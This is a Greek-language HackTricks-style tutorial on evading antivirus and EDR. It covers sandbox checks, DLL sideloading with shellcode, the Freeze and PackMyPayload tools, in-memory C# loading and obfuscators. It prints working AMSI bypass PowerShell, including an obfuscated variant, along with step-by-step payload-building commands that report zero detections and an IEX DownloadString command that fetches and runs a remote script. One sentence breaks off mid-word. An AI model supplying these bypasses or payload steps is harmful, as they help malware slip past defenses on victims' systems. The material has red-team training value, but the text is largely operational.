# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}


**Αυτή η σελίδα γράφτηκε από** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## **Μεθοδολογία Παράκαμψης AV**

Αυτή τη στιγμή, τα AV χρησιμοποιούν διάφορες μεθόδους για να ελέγξουν αν ένα αρχείο είναι κακόβουλο ή όχι, στατική ανίχνευση, δυναμική ανάλυση και για τα πιο προηγμένα EDRs, ανάλυση συμπεριφοράς.

### **Στατική ανίχνευση**

Η στατική ανίχνευση επιτυγχάνεται με την επισήμανση γνωστών κακόβουλων συμβολοσειρών ή πινάκων byte σε ένα δυαδικό ή σενάριο, και επίσης με την εξαγωγή πληροφοριών από το ίδιο το αρχείο (π.χ. περιγραφή αρχείου, όνομα εταιρείας, ψηφιακές υπογραφές, εικονίδιο, έλεγχος ακεραιότητας κ.λπ.). Αυτό σημαίνει ότι η χρήση γνωστών δημόσιων εργαλείων μπορεί να σας πιάσει πιο εύκολα, καθώς πιθανότατα έχουν αναλυθεί και επισημανθεί ως κακόβουλα. Υπάρχουν μερικοί τρόποι για να παρακάμψετε αυτό το είδος ανίχνευσης:

- **Κρυπτογράφηση**

Αν κρυπτογραφήσετε το δυαδικό, δεν θα υπάρχει τρόπος για το AV να ανιχνεύσει το πρόγραμμα σας, αλλά θα χρειαστείτε κάποιο είδος φορτωτή για να αποκρυπτογραφήσετε και να εκτελέσετε το πρόγραμμα στη μνήμη.

- **Αποσύνθεση**

Μερικές φορές το μόνο που χρειάζεται να κάνετε είναι να αλλάξετε μερικές συμβολοσειρές στο δυαδικό ή σενάριο σας για να το περάσετε από το AV, αλλά αυτό μπορεί να είναι μια χρονοβόρα εργασία ανάλογα με το τι προσπαθείτε να αποσυνθέσετε.

- **Προσαρμοσμένα εργαλεία**

Αν αναπτύξετε τα δικά σας εργαλεία, δεν θα υπάρχουν γνωστές κακές υπογραφές, αλλά αυτό απαιτεί πολύ χρόνο και προσπάθεια.

> [!NOTE]
> Ένας καλός τρόπος για να ελέγξετε την στατική ανίχνευση του Windows Defender είναι το [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Βασικά χωρίζει το αρχείο σε πολλαπλά τμήματα και στη συνέχεια ζητά από τον Defender να σαρώσει το καθένα ξεχωριστά, με αυτόν τον τρόπο, μπορεί να σας πει ακριβώς ποιες είναι οι επισημασμένες συμβολοσειρές ή bytes στο δυαδικό σας.

Σας συνιστώ ανεπιφύλακτα να δείτε αυτήν την [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) σχετικά με την πρακτική Παράκαμψη AV.

### **Δυναμική ανάλυση**

Η δυναμική ανάλυση είναι όταν το AV εκτελεί το δυαδικό σας σε ένα sandbox και παρακολουθεί για κακόβουλη δραστηριότητα (π.χ. προσπαθώντας να αποκρυπτογραφήσει και να διαβάσει τους κωδικούς πρόσβασης του προγράμματος περιήγησης σας, εκτελώντας ένα minidump στο LSASS, κ.λπ.). Αυτό το μέρος μπορεί να είναι λίγο πιο δύσκολο να δουλέψετε, αλλά εδώ είναι μερικά πράγματα που μπορείτε να κάνετε για να παρακάμψετε τα sandbox.

- **Ύπνος πριν την εκτέλεση** Ανάλογα με το πώς έχει υλοποιηθεί, μπορεί να είναι ένας εξαιρετικός τρόπος για να παρακάμψετε την δυναμική ανάλυση του AV. Τα AV έχουν πολύ λίγο χρόνο για να σαρώσουν τα αρχεία ώστε να μην διακόψουν τη ροή εργασίας του χρήστη, οπότε η χρήση μεγάλων περιόδων ύπνου μπορεί να διαταράξει την ανάλυση των δυαδικών. Το πρόβλημα είναι ότι πολλά sandbox AV μπορούν απλά να παραλείψουν τον ύπνο ανάλογα με το πώς έχει υλοποιηθεί.
- **Έλεγχος πόρων μηχανής** Συνήθως, τα Sandbox έχουν πολύ λίγους πόρους για να δουλέψουν (π.χ. < 2GB RAM), αλλιώς θα μπορούσαν να επιβραδύνουν τη μηχανή του χρήστη. Μπορείτε επίσης να γίνετε πολύ δημιουργικοί εδώ, για παράδειγμα ελέγχοντας τη θερμοκρασία της CPU ή ακόμη και τις ταχύτητες των ανεμιστήρων, δεν θα έχει όλα υλοποιηθεί στο sandbox.
- **Έλεγχοι συγκεκριμένοι για τη μηχανή** Αν θέλετε να στοχεύσετε έναν χρήστη του οποίου ο σταθμός εργασίας είναι συνδεδεμένος στο τομέα "contoso.local", μπορείτε να κάνετε έναν έλεγχο στον τομέα του υπολογιστή για να δείτε αν ταιριάζει με αυτόν που έχετε καθορίσει, αν δεν ταιριάζει, μπορείτε να κάνετε το πρόγραμμα σας να τερματίσει.

Αποδεικνύεται ότι το όνομα υπολογιστή του Sandbox του Microsoft Defender είναι HAL9TH, οπότε μπορείτε να ελέγξετε το όνομα υπολογιστή στο κακόβουλο λογισμικό σας πριν από την έκρηξη, αν το όνομα ταιριάζει με HAL9TH, σημαίνει ότι είστε μέσα στο sandbox του defender, οπότε μπορείτε να κάνετε το πρόγραμμα σας να τερματίσει.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>πηγή: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Μερικές άλλες πολύ καλές συμβουλές από [@mgeeky](https://twitter.com/mariuszbit) για να πάτε ενάντια στα Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev κανάλι</p></figcaption></figure>

Όπως έχουμε πει προηγουμένως σε αυτήν την ανάρτηση, **δημόσια εργαλεία** θα **ανιχνευθούν** τελικά, οπότε, θα πρέπει να ρωτήσετε τον εαυτό σας κάτι:

Για παράδειγμα, αν θέλετε να κάνετε dump LSASS, **χρειάζεστε πραγματικά να χρησιμοποιήσετε το mimikatz**; Ή θα μπορούσατε να χρησιμοποιήσετε ένα διαφορετικό έργο που είναι λιγότερο γνωστό και επίσης κάνει dump LSASS.

Η σωστή απάντηση είναι πιθανώς η δεύτερη. Παίρνοντας το mimikatz ως παράδειγμα, είναι πιθανώς ένα από τα πιο επισημασμένα κομμάτια κακόβουλου λογισμικού από τα AV και EDRs, ενώ το έργο αυτό είναι πολύ ωραίο, είναι επίσης ένας εφιάλτης να δουλέψετε μαζί του για να παρακάμψετε τα AV, οπότε απλά αναζητήστε εναλλακτικές για αυτό που προσπαθείτε να επιτύχετε.

> [!NOTE]
> Όταν τροποποιείτε τα payload σας για παράκαμψη, βεβαιωθείτε ότι έχετε **απενεργοποιήσει την αυτόματη υποβολή δειγμάτων** στον defender, και παρακαλώ, σοβαρά, **ΜΗΝ ΑΝΕΒΑΖΕΤΕ ΣΤΟ VIRUSTOTAL** αν ο στόχος σας είναι να επιτύχετε παράκαμψη μακροπρόθεσμα. Αν θέλετε να ελέγξετε αν το payload σας ανιχνεύεται από ένα συγκεκριμένο AV, εγκαταστήστε το σε μια VM, προσπαθήστε να απενεργοποιήσετε την αυτόματη υποβολή δειγμάτων, και δοκιμάστε το εκεί μέχρι να είστε ικανοποιημένοι με το αποτέλεσμα.

## EXEs vs DLLs

Όποτε είναι δυνατόν, πάντα **προτιμήστε να χρησιμοποιείτε DLLs για παράκαμψη**, από την εμπειρία μου, τα αρχεία DLL είναι συνήθως **πολύ λιγότερο ανιχνεύσιμα** και αναλυόμενα, οπότε είναι ένα πολύ απλό κόλπο για να αποφύγετε την ανίχνευση σε ορισμένες περιπτώσεις (αν το payload σας έχει κάποιον τρόπο να εκτελείται ως DLL φυσικά).

Όπως μπορούμε να δούμε σε αυτήν την εικόνα, ένα Payload DLL από το Havoc έχει ποσοστό ανίχνευσης 4/26 στο antiscan.me, ενώ το payload EXE έχει ποσοστό ανίχνευσης 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>σύγκριση του κανονικού payload EXE του Havoc με ένα κανονικό DLL του Havoc</p></figcaption></figure>

Τώρα θα δείξουμε μερικά κόλπα που μπορείτε να χρησιμοποιήσετε με αρχεία DLL για να είστε πολύ πιο διακριτικοί.

## DLL Sideloading & Proxying

**DLL Sideloading** εκμεταλλεύεται τη σειρά αναζήτησης DLL που χρησιμοποιείται από τον φορτωτή τοποθετώντας τόσο την εφαρμογή του θύματος όσο και τα κακόβουλα payloads δίπλα-δίπλα.

Μπορείτε να ελέγξετε για προγράμματα που είναι ευάλωτα σε DLL Sideloading χρησιμοποιώντας το [Siofra](https://github.com/Cybereason/siofra) και το παρακάτω script powershell:
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Αυτή η εντολή θα εξάγει τη λίστα των προγραμμάτων που είναι ευάλωτα σε DLL hijacking μέσα στο "C:\Program Files\\" και τα αρχεία DLL που προσπαθούν να φορτώσουν.

Συνιστώ ανεπιφύλακτα να **εξερευνήσετε τα προγράμματα που είναι επιρρεπή σε DLL Hijackable/Sideloadable μόνοι σας**, αυτή η τεχνική είναι αρκετά διακριτική αν γίνει σωστά, αλλά αν χρησιμοποιήσετε δημόσια γνωστά προγράμματα Sideloadable DLL, μπορεί να σας πιάσουν εύκολα.

Απλά τοποθετώντας μια κακόβουλη DLL με το όνομα που περιμένει να φορτώσει ένα πρόγραμμα, δεν θα φορτώσει το payload σας, καθώς το πρόγραμμα περιμένει κάποιες συγκεκριμένες λειτουργίες μέσα σε αυτή τη DLL. Για να διορθώσουμε αυτό το ζήτημα, θα χρησιμοποιήσουμε μια άλλη τεχνική που ονομάζεται **DLL Proxying/Forwarding**.

**DLL Proxying** προωθεί τις κλήσεις που κάνει ένα πρόγραμμα από την proxy (και κακόβουλη) DLL στην αρχική DLL, διατηρώντας έτσι τη λειτουργικότητα του προγράμματος και επιτρέποντας την εκτέλεση του payload σας.

Θα χρησιμοποιήσω το έργο [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) από [@flangvik](https://twitter.com/Flangvik/)

Αυτά είναι τα βήματα που ακολούθησα:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Η τελευταία εντολή θα μας δώσει 2 αρχεία: ένα πρότυπο πηγαίου κώδικα DLL και την αρχική μετονομασμένη DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Και ο κώδικας μας (κωδικοποιημένος με [SGN](https://github.com/EgeBalci/sgn)) και το proxy DLL έχουν ποσοστό ανίχνευσης 0/26 στο [antiscan.me](https://antiscan.me)! Θα το χαρακτήριζα επιτυχία.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Σας **συνιστώ έντονα** να παρακολουθήσετε το [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) σχετικά με το DLL Sideloading και επίσης το [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) για να μάθετε περισσότερα σχετικά με όσα έχουμε συζητήσει πιο αναλυτικά.

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Μπορείτε να χρησιμοποιήσετε το Freeze για να φορτώσετε και να εκτελέσετε τον κώδικά σας με διακριτικό τρόπο.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Η αποφυγή είναι απλώς ένα παιχνίδι γάτας και ποντικιού, αυτό που λειτουργεί σήμερα μπορεί να ανιχνευθεί αύριο, οπότε μην βασίζεστε μόνο σε ένα εργαλείο, αν είναι δυνατόν, προσπαθήστε να συνδυάσετε πολλές τεχνικές αποφυγής.

## AMSI (Διεπαφή Σάρωσης Κακόβουλου Λογισμικού)

Η AMSI δημιουργήθηκε για να αποτρέψει το "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Αρχικά, οι AVs ήταν ικανοί να σαρώσουν μόνο **αρχεία στον δίσκο**, οπότε αν μπορούσατε με κάποιο τρόπο να εκτελέσετε payloads **άμεσα στη μνήμη**, ο AV δεν μπορούσε να κάνει τίποτα για να το αποτρέψει, καθώς δεν είχε αρκετή ορατότητα.

Η δυνατότητα AMSI είναι ενσωματωμένη σε αυτά τα στοιχεία των Windows.

- Έλεγχος Λογαριασμού Χρήστη, ή UAC (ανύψωση EXE, COM, MSI ή εγκατάστασης ActiveX)
- PowerShell (σενάρια, διαδραστική χρήση και δυναμική αξιολόγηση κώδικα)
- Windows Script Host (wscript.exe και cscript.exe)
- JavaScript και VBScript
- Μακροεντολές Office VBA

Επιτρέπει στις λύσεις antivirus να ελέγχουν τη συμπεριφορά των σεναρίων εκθέτοντας το περιεχόμενο των σεναρίων με μορφή που είναι τόσο μη κρυπτογραφημένη όσο και μη αποκρυπτογραφημένη.

Η εκτέλεση `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` θα παράγει την ακόλουθη ειδοποίηση στο Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Παρατηρήστε πώς προσθέτει `amsi:` και στη συνέχεια τη διαδρομή προς το εκτελέσιμο από το οποίο εκτελέστηκε το σενάριο, στην προκειμένη περίπτωση, powershell.exe

Δεν ρίξαμε κανένα αρχείο στον δίσκο, αλλά πάλι πιαστήκαμε στη μνήμη λόγω της AMSI.

Υπάρχουν μερικοί τρόποι για να παρακάμψετε την AMSI:

- **Αποκρυπτογράφηση**

Δεδομένου ότι η AMSI λειτουργεί κυρίως με στατικές ανιχνεύσεις, επομένως, η τροποποίηση των σεναρίων που προσπαθείτε να φορτώσετε μπορεί να είναι ένας καλός τρόπος για να αποφύγετε την ανίχνευση.

Ωστόσο, η AMSI έχει τη δυνατότητα να αποκρυπτογραφεί σενάρια ακόμη και αν έχει πολλαπλά επίπεδα, οπότε η αποκρυπτογράφηση μπορεί να είναι κακή επιλογή ανάλογα με το πώς γίνεται. Αυτό καθιστά την αποφυγή όχι και τόσο απλή. Αν και, μερικές φορές, το μόνο που χρειάζεται να κάνετε είναι να αλλάξετε μερικά ονόματα μεταβλητών και θα είστε εντάξει, οπότε εξαρτάται από το πόσο έχει επισημανθεί κάτι.

- **Παράκαμψη AMSI**

Δεδομένου ότι η AMSI υλοποιείται φορτώνοντας μια DLL στη διαδικασία powershell (επίσης cscript.exe, wscript.exe κ.λπ.), είναι δυνατό να παρέμβετε σε αυτήν εύκολα ακόμη και εκτελώντας ως μη προνομιούχος χρήστης. Λόγω αυτού του σφάλματος στην υλοποίηση της AMSI, οι ερευνητές έχουν βρει πολλούς τρόπους για να παρακάμψουν την ανίχνευση της AMSI.

**Εξαναγκασμός Σφάλματος**

Η εξαναγκασμένη αποτυχία της αρχικοποίησης AMSI (amsiInitFailed) θα έχει ως αποτέλεσμα να μην ξεκινήσει καμία σάρωση για τη τρέχουσα διαδικασία. Αρχικά, αυτό αποκαλύφθηκε από τον [Matt Graeber](https://twitter.com/mattifestation) και η Microsoft έχει αναπτύξει μια υπογραφή για να αποτρέψει τη μεγαλύτερη χρήση.
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Απαιτήθηκε μόνο μία γραμμή κώδικα powershell για να καταστήσει το AMSI μη λειτουργικό για τη τρέχουσα διαδικασία powershell. Αυτή η γραμμή έχει φυσικά επισημανθεί από το ίδιο το AMSI, οπότε απαιτείται κάποια τροποποίηση για να χρησιμοποιηθεί αυτή η τεχνική.

Εδώ είναι μια τροποποιημένη παράκαμψη AMSI που πήρα από αυτό το [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Λάβετε υπόψη ότι αυτό πιθανότατα θα σημειωθεί μόλις δημοσιευτεί αυτή η ανάρτηση, οπότε δεν θα πρέπει να δημοσιεύσετε κανέναν κώδικα αν το σχέδιό σας είναι να παραμείνετε αόρατοι.

**Memory Patching**

Αυτή η τεχνική ανακαλύφθηκε αρχικά από [@RastaMouse](https://twitter.com/_RastaMouse/) και περιλαμβάνει την εύρεση διεύθυνσης για τη λειτουργία "AmsiScanBuffer" στο amsi.dll (υπεύθυνη για την σάρωση της εισόδου που παρέχεται από τον χρήστη) και την αντικατάστασή της με οδηγίες για την επιστροφή του κωδικού E_INVALIDARG, με αυτόν τον τρόπο, το αποτέλεσμα της πραγματικής σάρωσης θα επιστρέφει 0, το οποίο ερμηνεύεται ως καθαρό αποτέλεσμα.

> [!NOTE]
> Παρακαλώ διαβάστε [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) για μια πιο λεπτομερή εξήγηση.

Υπάρχουν επίσης πολλές άλλες τεχνικές που χρησιμοποιούνται για να παρακάμψουν το AMSI με powershell, δείτε [**αυτή τη σελίδα**](basic-powershell-for-pentesters/#amsi-bypass) και [αυτό το repo](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) για να μάθετε περισσότερα σχετικά με αυτές.

Ή αυτό το σενάριο που μέσω memory patching θα διορθώσει κάθε νέο Powersh

## Obfuscation

Υπάρχουν αρκετά εργαλεία που μπορούν να χρησιμοποιηθούν για να **obfuscate C# clear-text code**, να δημιουργήσουν **metaprogramming templates** για τη σύνθεση δυαδικών αρχείων ή να **obfuscate compiled binaries** όπως:

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Ο στόχος αυτού του έργου είναι να παρέχει ένα ανοιχτού κώδικα fork της [LLVM](http://www.llvm.org/) σουίτας σύνθεσης ικανής να παρέχει αυξημένη ασφάλεια λογισμικού μέσω [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) και tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): Το ADVobfuscator δείχνει πώς να χρησιμοποιήσετε τη γλώσσα `C++11/14` για να δημιουργήσετε, κατά τη διάρκεια της σύνθεσης, obfuscated code χωρίς τη χρήση εξωτερικού εργαλείου και χωρίς να τροποποιήσετε τον μεταγλωττιστή.
- [**obfy**](https://github.com/fritzone/obfy): Προσθέτει μια στρώση obfuscated operations που δημιουργούνται από το πλαίσιο metaprogramming C++ template, το οποίο θα κάνει τη ζωή του ατόμου που θέλει να σπάσει την εφαρμογή λίγο πιο δύσκολη.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Το Alcatraz είναι ένας obfuscator x64 binary που είναι ικανός να obfuscate διάφορα διαφορετικά αρχεία pe, συμπεριλαμβανομένων: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Το Metame είναι μια απλή μηχανή metamorphic code για αυθαίρετους εκτελέσιμους.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): Το ROPfuscator είναι ένα λεπτομερές πλαίσιο obfuscation κώδικα για γλώσσες που υποστηρίζονται από LLVM χρησιμοποιώντας ROP (return-oriented programming). Το ROPfuscator obfuscates ένα πρόγραμμα σε επίπεδο κώδικα assembly μετατρέποντας κανονικές εντολές σε ROP chains, αποτρέποντας την φυσική μας αντίληψη της κανονικής ροής ελέγχου.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Το Nimcrypt είναι ένας .NET PE Crypter γραμμένος σε Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Το Inceptor είναι ικανό να μετατρέπει υπάρχοντα EXE/DLL σε shellcode και στη συνέχεια να τα φορτώνει

## SmartScreen & MoTW

Μπορεί να έχετε δει αυτή την οθόνη όταν κατεβάζετε κάποια εκτελέσιμα από το διαδίκτυο και τα εκτελείτε.

Το Microsoft Defender SmartScreen είναι ένας μηχανισμός ασφαλείας που προορίζεται να προστατεύσει τον τελικό χρήστη από την εκτέλεση δυνητικά κακόβουλων εφαρμογών.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

Το SmartScreen λειτουργεί κυρίως με μια προσέγγιση βασισμένη στη φήμη, πράγμα που σημαίνει ότι οι εφαρμογές που κατεβάζονται σπάνια θα ενεργοποιήσουν το SmartScreen, προειδοποιώντας και αποτρέποντας τον τελικό χρήστη από την εκτέλεση του αρχείου (αν και το αρχείο μπορεί να εκτελεστεί κάνοντας κλικ στο More Info -> Run anyway).

**MoTW** (Mark of The Web) είναι ένα [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) με το όνομα Zone.Identifier που δημιουργείται αυτόματα κατά τη λήψη αρχείων από το διαδίκτυο, μαζί με το URL από το οποίο κατεβάστηκε.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Έλεγχος του Zone.Identifier ADS για ένα αρχείο που κατεβάστηκε από το διαδίκτυο.</p></figcaption></figure>

> [!NOTE]
> Είναι σημαντικό να σημειωθεί ότι τα εκτελέσιμα που υπογράφονται με ένα **trusted** signing certificate **δεν θα ενεργοποιήσουν το SmartScreen**.

Ένας πολύ αποτελεσματικός τρόπος για να αποτρέψετε τα payloads σας από το να αποκτήσουν το Mark of The Web είναι να τα συσκευάσετε μέσα σε κάποιο είδος κοντέινερ όπως ένα ISO. Αυτό συμβαίνει επειδή το Mark-of-the-Web (MOTW) **δεν μπορεί** να εφαρμοστεί σε **μη NTFS** τόμους.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) είναι ένα εργαλείο που συσκευάζει payloads σε κοντέινερ εξόδου για να αποφύγει το Mark-of-the-Web.

Παράδειγμα χρήσης:
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Εδώ είναι μια επίδειξη για την παράκαμψη του SmartScreen συσκευάζοντας payloads μέσα σε αρχεία ISO χρησιμοποιώντας [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## C# Assembly Reflection

Η φόρτωση C# binaries στη μνήμη είναι γνωστή εδώ και αρκετό καιρό και είναι ακόμα ένας πολύ καλός τρόπος για να εκτελείτε τα εργαλεία post-exploitation σας χωρίς να πιαστείτε από το AV.

Δεδομένου ότι το payload θα φορτωθεί απευθείας στη μνήμη χωρίς να αγγίξει το δίσκο, θα πρέπει να ανησυχούμε μόνο για την επιδιόρθωση του AMSI για ολόκληρη τη διαδικασία.

Οι περισσότερες C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, κ.λπ.) παρέχουν ήδη τη δυνατότητα εκτέλεσης C# assemblies απευθείας στη μνήμη, αλλά υπάρχουν διαφορετικοί τρόποι για να το κάνετε αυτό:

- **Fork\&Run**

Αυτό περιλαμβάνει **δημιουργία μιας νέας θυσιαστικής διαδικασίας**, εισάγοντας τον κακόβουλο κώδικα post-exploitation σε αυτή τη νέα διαδικασία, εκτελώντας τον κακόβουλο κώδικα και όταν τελειώσει, σκοτώνοντας τη νέα διαδικασία. Αυτό έχει τόσο τα πλεονεκτήματα όσο και τα μειονεκτήματά του. Το πλεονέκτημα της μεθόδου fork and run είναι ότι η εκτέλεση συμβαίνει **έξω** από τη διαδικασία του Beacon implant μας. Αυτό σημαίνει ότι αν κάτι στην ενέργεια post-exploitation μας πάει στραβά ή πιαστεί, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **επιβιώσει το implant μας.** Το μειονέκτημα είναι ότι έχετε **μεγαλύτερη πιθανότητα** να πιαστείτε από **Behavioral Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Αφορά την εισαγωγή του κακόβουλου κώδικα post-exploitation **στη δική του διαδικασία**. Με αυτόν τον τρόπο, μπορείτε να αποφύγετε τη δημιουργία νέας διαδικασίας και να την σκανάρετε από το AV, αλλά το μειονέκτημα είναι ότι αν κάτι πάει στραβά με την εκτέλεση του payload σας, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **χάσετε το beacon σας** καθώς μπορεί να καταρρεύσει.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Αν θέλετε να διαβάσετε περισσότερα σχετικά με τη φόρτωση C# Assembly, παρακαλώ ελέγξτε αυτό το άρθρο [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) και το InlineExecute-Assembly BOF τους ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Μπορείτε επίσης να φορτώσετε C# Assemblies **από το PowerShell**, ελέγξτε το [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) και το [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Χρήση Άλλων Γλωσσών Προγραμματισμού

Όπως προτάθηκε στο [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), είναι δυνατόν να εκτελέσετε κακόβουλο κώδικα χρησιμοποιώντας άλλες γλώσσες δίνοντας στη συμβιβασμένη μηχανή πρόσβαση **στο περιβάλλον διερμηνέα που είναι εγκατεστημένο στο SMB share που ελέγχεται από τον επιτιθέμενο**.

Επιτρέποντας την πρόσβαση στα Interpreter Binaries και το περιβάλλον στο SMB share μπορείτε να **εκτελέσετε αυθαίρετο κώδικα σε αυτές τις γλώσσες μέσα στη μνήμη** της συμβιβασμένης μηχανής.

Το repo υποδεικνύει: Ο Defender σκανάρει ακόμα τα scripts αλλά χρησιμοποιώντας Go, Java, PHP κ.λπ. έχουμε **περισσότερη ευελιξία για να παρακάμψουμε τις στατικές υπογραφές**. Οι δοκιμές με τυχαία μη-αποκρυπτογραφημένα reverse shell scripts σε αυτές τις γλώσσες έχουν αποδειχθεί επιτυχείς.

## Προχωρημένη Απόκρυψη

Η απόκρυψη είναι ένα πολύ περίπλοκο θέμα, μερικές φορές πρέπει να λάβετε υπόψη πολλές διαφορετικές πηγές τηλεμετρίας σε ένα μόνο σύστημα, οπότε είναι σχεδόν αδύνατο να παραμείνετε εντελώς αόρατοι σε ώριμα περιβάλλοντα.

Κάθε περιβάλλον που αντιμετωπίζετε θα έχει τα δικά του πλεονεκτήματα και αδυναμίες.

Σας προτείνω να παρακολουθήσετε αυτή την ομιλία από τον [@ATTL4S](https://twitter.com/DaniLJ94), για να αποκτήσετε μια βάση σε πιο προχωρημένες τεχνικές απόκρυψης.

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

Αυτή είναι επίσης μια άλλη εξαιρετική ομιλία από τον [@mariuszbit](https://twitter.com/mariuszbit) σχετικά με την Απόκρυψη σε Βάθος.

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **Παλαιές Τεχνικές**

### **Ελέγξτε ποιες περιοχές βρίσκει ο Defender ως κακόβουλες**

Μπορείτε να χρησιμοποιήσετε [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) που θα **αφαιρέσει μέρη του binary** μέχρι να **ανακαλύψει ποιο μέρος βρίσκει ο Defender** ως κακόβουλο και να το διαχωρίσει για εσάς.\
